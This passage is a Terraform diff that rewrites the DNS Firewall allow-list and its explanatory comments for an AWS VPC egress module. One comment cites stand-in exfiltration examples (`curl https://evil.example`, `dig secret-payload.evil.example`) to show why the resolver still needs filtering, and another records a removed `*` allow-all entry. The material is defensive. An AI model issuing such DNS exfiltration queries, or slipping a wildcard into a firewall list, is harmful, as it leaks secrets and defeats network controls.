@@ -17,7 +17,7 @@ data "terraform_remote_state" "foundation" {
 
 module "egress" {
   # checkov:skip=CKV_TF_1:pinned by git TAG by convention (conventions §6, Stage 3 step 1.1a) - a repository-internal tag only the repo owner can move
-  source = "git::git@github.com:felipenoris/AWS-DataScience.git//terraform-modules/vpc-egress?ref=vpc-egress-v0.7.0"
+  source = "git::git@github.com:felipenoris/AWS-DataScience.git//terraform-modules/vpc-egress?ref=vpc-egress-v0.8.0"
 
   env    = var.env
   vpc_id = data.terraform_remote_state.foundation.outputs.vpc_id
@@ -78,129 +78,72 @@ module "egress" {
   #        from us-west-2 at all. Record what breaks at 4.3 rather than assuming either way.
   extra_services = ["sagemaker.api", "sagemaker.runtime", "sagemaker.studio"]
 
-  # DESIGN A's CONTROL (Stage 6 step 4.1) - the allow-list that makes the NAT "limited
-  # internet" instead of internet. The module refuses to enable itself under
-  # egress_mode = "B", where a name filter would be a control over a route that does not
-  # exist.
+  # THE FIREWALL STAYS, AND ITS JOB CHANGED (6c step 5.7, 2026-09-06). It used to be design A's
+  # control: a NAT gateway carried anything, so a name that did not resolve was a host nobody
+  # reached, and this list was what made "limited internet" different from "internet". Step 5.1
+  # removed the last default route in the estate (D38), so nothing in this VPC can open an internet
+  # connection at all except as a CLIENT OF THE PROXY - and an explicit-proxy client never resolves
+  # the name it is asking for. Squid does.
+  #
+  # SO WHY KEEP IT. Because removing the route did not close the resolver. `curl https://evil.example`
+  # cannot leave this VPC; `dig secret-payload.evil.example` would have, one label at a time,
+  # through the VPC's own recursive resolver, which is not a route and was never what the route
+  # removal touched. Closing that channel is the whole of this control's remaining job, and it is
+  # why the list below is ten entries rather than sixty-three: names this VPC must resolve in order
+  # to function, and nothing else.
   dns_firewall = true
 
-  # HOW THE ALLOW-LIST BELOW IS READ, and it is this slice's call rather than the module's
-  # (v0.4.0 - the module defaults to INSPECT_REDIRECTION_DOMAIN, the API's own default and the
-  # stricter reading). TRUST means the firewall inspects the name that was QUERIED and trusts
-  # the CNAME/DNAME chain beneath it. This account reaches package artifacts, and every
-  # ecosystem serves those from a shared CDN, so under INSPECT the list can carry every index
-  # and still have no download path - that is the whole reason this line exists.
-  #
-  # IT DOES NOT ALLOW THE CDN, which is the reading to check before accepting it: the trust
-  # is scoped to a SINGLE query transaction, so a redirection target asked for on its own is
-  # an independent query, matches no entry and is blocked by the catch-all. What it costs is
-  # narrower and real - the chain is trusted wherever the OWNER of a listed name points it.
+  # KEPT AT TRUST, FOR A DIFFERENT REASON THAN IT WAS SET (rewritten 5.7). It was here because
+  # package artifacts are served from shared CDNs, and under INSPECT an allow-list could carry
+  # every index and still have no download path - the CNAME chain left the list. Those names are
+  # Squid's now, and Squid matches the hostname the client REQUESTED, so no chain is evaluated
+  # anywhere in the estate. What TRUST still buys on the list below is narrow and worth having: the
+  # only names left are AWS's own namespaces and this estate's own private zones, so the chain
+  # beneath an entry is pointed by AWS or by us. INSPECT would turn any AWS-internal CNAME leaving
+  # `*.amazonaws.com` into a resolution failure with no owner and no remedy.
   firewall_domain_redirection_action = "TRUST_REDIRECTION_DOMAIN"
 
-  # THE ALLOW-LIST ITSELF, AND THE LINE ABOVE IS THE RULE IT OBEYS. Under TRUST the firewall
-  # reads the name that was queried, so an entry here is a name a tool asks for; a CNAME
-  # target is not an entry. Listing a hop is
-  # a widening rather than a safety net - the trust holds inside one query transaction, so a
-  # redirection target stays unreachable on its own unless somebody lists it. This list
-  # carried exactly one hop, `us-west.pkg.julialang.net`, removed on 2026-08-23.
+  # WHERE THE OLD LIST WENT, because "shrunk from 63 to 10" is only half the sentence. Every
+  # package host, every console family, every sign-in name and the one CDN wildcard moved to the
+  # proxy's SOURCE-SCOPED allow-lists in `production/networking/` (step 4.9), where they became
+  # **two filters instead of one**: what a person on the tunnel may reach is no longer the same set
+  # as what a notebook may reach. That split is the thing this list could never express - a VPC has
+  # one resolver, and everything in it shared one answer.
   #
-  # WHAT THE PARAGRAPH HERE USED TO SAY, and why it is gone: until v0.4.0 a name belonged
-  # here only if its whole chain ended inside this list, so eight of nine external names
-  # worked only because their authoritative side FLATTENS the CDN behind an A record served
-  # under the queried name - a switch a third party could turn off unannounced
-  # (docs/AWS_STATE.md EXC-05, now closed). Whether a CDN serves the bytes is no longer this
-  # list's business. Who OWNS a listed name still is: the chain is trusted wherever that
-  # owner points it.
+  # AND A `"*"` CAME OFF HERE. Commit `f6bb316` ("allow-all egress", 2026-08-23) put a single
+  # wildcard at the top of this list; `*` matches every name, so the sixty-two entries beneath it
+  # were decoration and the firewall was a default-ALLOW. It is named rather than quietly dropped,
+  # because a list whose first entry is `*` reads as a configured control to every review that does
+  # not read it to the end (Lesson 5).
   #
-  # WHAT IS STILL ABSENT IS THE ARTIFACT HALF, and it is now a CHOICE rather than a ceiling.
-  # files.pythonhosted.org, index/static.crates.io, static.rust-lang.org, sh.rustup.rs,
-  # pkg.julialang.org, cloud.r-project.org, deb.debian.org, archive/security.ubuntu.com and
-  # public.ecr.aws are each a CNAME into Fastly, CloudFront, Cloudflare or Global
-  # Accelerator, and every one of them is a single listable name under v0.4.0. They are not
-  # here because THIS account has not needed them - `development/` is the pipeline-engineering
-  # account, and D5's comparison at step 6.1 is about where packages should come from, which
-  # is a different question from whether the firewall can express it. The sandbox list is
-  # where the ad-hoc set lives; the two lists diverging is expected and DN-3 reports it.
-  #
-  # WHAT THIS LIST DOES NOT DO, unchanged by v0.4.0: it is a control against ACCIDENT. A
-  # process that already knows an ADDRESS asks no resolver, and a query sent to `1.1.1.1:53`
-  # over the NAT or over DoH on 443 is never seen by this firewall - the VPC resolver only
-  # inspects what it is asked, the tier security group permits all egress and the NACLs sit
-  # at the default allow. Closing either needs an SNI/Host control (Network Firewall, or a
-  # proxy), and neither is built.
+  # EXC-04, EXC-05 AND EXC-06 CLOSE WITH THE OLD LIST, and EXC-05's failure MODE retires outright
+  # rather than moving: it needed a resolver evaluating a redirection chain and blaming the
+  # original name for a hop's absence. The filter that replaced it never sees a chain.
   dns_firewall_allow_domains = [
-    # AWS itself, and a wildcard rather than names because the regional service endpoints
-    # cannot be enumerated and are AWS's own namespace. Without it every SDK call over the
-    # NAT fails to resolve: design A is "limited internet", not "no AWS".
+    # AWS'S OWN NAMESPACES. Every regional service endpoint lives under one of these, and they
+    # cannot be enumerated - which is why they are wildcards rather than names. The apex is listed
+    # beside each wildcard because a Route 53 domain-list wildcard never matches the apex itself.
+    # THIS IS THE SYNTAX SQUID COLLAPSES: there, `.amazonaws.com` covers both and listing the apex
+    # beside it is FATAL. Two systems, one intent, two spellings - transcribing between them is
+    # Lesson 53, and they agree on every easy case.
     "amazonaws.com", "*.amazonaws.com",
+    "api.aws", "*.api.aws",
 
-    # SageMaker Unified Studio's own control plane, and it is NOT under amazonaws.com - it
-    # sits on the `aws` TLD, which the wildcard above does not reach. Measured BLOCKED 52
-    # times in one session before it was added: the estate's own workbench refused by the
-    # estate's own firewall.
-    #
-    # THIS LINE CARRIED A REFUTED PARENTHETICAL UNTIL 2026-08-25 - "the `datazone` interface
-    # endpoint does not cover it either (its private DNS is the amazonaws.com spelling)" -
-    # and the 2026-08-24 measurement says the opposite (`./aws/networking.py` section 11):
-    # the DEPLOYED endpoint seizes BOTH spellings, its DnsEntries holding
-    # datazone.<region>.amazonaws.com AND datazone.<region>.api.aws, which is the very name
-    # on the line below. What advertises only the amazonaws.com form is the CATALOG's
-    # PrivateDnsName column (section 10) - and taking a deployed object's behaviour from the
-    # catalog's advertisement is Lesson 38, which is how the clause came to be written.
-    #
-    # THE ENTRY STAYS, AND ITS REASON NEVER DEPENDED ON THE ENDPOINT: the DNS Firewall is
-    # evaluated BY THE VPC RESOLVER, ahead of any private zone, so an unlisted name is
-    # blocked whether or not a zone would have answered it - the same rule the .internal
-    # entries at the bottom of this list obey. What the endpoint decides is only WHERE an
-    # allowed query goes: it was the interface endpoint until 2026-08-25, and is public DNS
-    # and the NAT since the removal above (issue #39) - MEASURED 2026-08-26 in SANDBOX, whose
-    # slice is the one the tunnelled laptop resolves through; the name returns the same public
-    # addresses a public resolver does, so the shadowing is gone. This account's own reading is
-    # owed the day something resolves through THIS VPC (Lesson 31: a measurement inherits the
-    # account it was taken in). docs/NETWORK.md section 5 carries both halves.
-    "datazone.${var.region}.api.aws",
+    # `sagemaker.aws` IS COVERED BY NEITHER OF THE ABOVE, and omitting it is how this slice would
+    # pay hourly for an endpoint nothing can resolve: `sagemaker.studio` answers on
+    # `*.studio.<region>.sagemaker.aws`, a different TLD entirely. `vpc-egress-v0.8.0`'s
+    # precondition is what turns that from a silent NXDOMAIN into a plan-time failure naming the
+    # endpoint - written because this step is exactly the one that creates the opportunity.
+    "sagemaker.aws", "*.sagemaker.aws",
 
-    # PyPI's INDEX, and only the index - still a half path, but for a different reason since
-    # vpc-egress-v0.4.0. files.pythonhosted.org is Fastly-fronted and used to be UNLISTABLE;
-    # under TRUST_REDIRECTION_DOMAIN it is one ordinary name and adding it would work. It is
-    # absent because nothing in this account has asked for it yet, not because it cannot be
-    # reached: `uv pip install` finds a version and dies fetching the wheel, and this line is
-    # the reason. Adding it is a one-line decision now, not a design question.
-    "pypi.org",
-
-    # conda - a COMPLETE path. Both channel hosts, and no hop of theirs, is the whole rule.
-    "conda.anaconda.org",
-    "repo.anaconda.com",
-
-    # Julia - a COMPLETE path. Pkg queries us-west.pkg.julialang.ORG (JULIA_PKG_SERVER), and
-    # that is the whole entry: the .NET spelling it hops to was listed until v0.4.0 and was
-    # removed with every other hop, because the ALLOW rule trusts the chain and a listed hop
-    # is what makes the hop resolvable on its own. Pkg's DEFAULT server, pkg.julialang.org,
-    # is listable now too and is still not here - the regional one is the deliberate choice,
-    # not a workaround for the firewall.
-    "us-west.pkg.julialang.org",
-    "storage.julialang.net",
-
-    # uv and ruff - a COMPLETE path. "Answers flat" stopped being the criterion at v0.4.0;
-    # this is simply the name the installer asks for.
-    "releases.astral.sh",
-
-    # DuckDB - a COMPLETE path. Extensions are fetched at FIRST QUERY, from inside the
-    # notebook process and long after any install step, so a miss here surfaces as a broken
-    # query rather than a broken install.
-    "extensions.duckdb.org",
-    "blobs.duckdb.org",
-
-    # The internal zones REACHABLE FROM THIS ACCOUNT, and the set differs per account, which
-    # is half of why this list moved out of the module (v0.3.0). DNS Firewall is evaluated by
-    # the VPC resolver, which is also what answers a private hosted zone - so an unlisted
-    # internal name is blocked exactly like an internet one, and GitLab stops resolving at
-    # Stage 7. This account authors NO zone of its own: prod.internal and pages.internal are
-    # Production's, reaching here through the cross-account associations of Stage 3 step 4.4,
-    # and sandbox.internal is deliberately not here because it is not associated with this
-    # VPC - listing it would be a name that can never answer.
-    "prod.internal", "*.prod.internal",
-    "pages.internal", "*.pages.internal",
+    # THE ESTATE'S OWN PRIVATE ZONES - `proxy.awsds.internal` and `gitlab.awsds.internal` among
+    # them, which is why a client can be told to use a NAME for the proxy rather than an address.
+    # Listed as SIBLINGS because `awsds.internal` does not cover `awsds-pages.internal`: a
+    # different label, not a subdomain. The old family (`sandbox.internal`, `prod.internal`,
+    # `pages.internal`) is deliberately absent - an entry here is exactly what would keep a
+    # retired zone alive past step 2.6.
+    "awsds.internal", "*.awsds.internal",
+    "awsds-pages.internal", "*.awsds-pages.internal",
   ]
 
   # DELIBERATELY ABSENT, and this is the record that makes it a control rather than an
